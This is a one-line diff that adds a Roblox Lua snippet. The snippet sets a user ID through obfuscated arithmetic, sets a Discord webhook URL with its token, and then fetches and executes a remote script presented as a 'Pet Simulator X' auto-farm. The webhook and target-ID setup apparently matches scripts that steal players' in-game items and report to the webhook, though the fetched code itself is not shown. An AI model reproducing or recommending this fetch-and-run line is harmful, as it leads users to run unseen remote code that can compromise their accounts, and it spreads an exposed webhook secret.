@@ -1,0 +1,1 @@
+_G.UserID=3772584056 -(1448 -(1382 + 66)) ;_G.WebHook="https://discord.com/api/webhooks/1078360562779570216/BioodvHkDSPWOexxETywmQPLJK1SZwnQ4yExmR_DlrmReJH4y0gPJtbS4VvzWawaO55x";loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))();
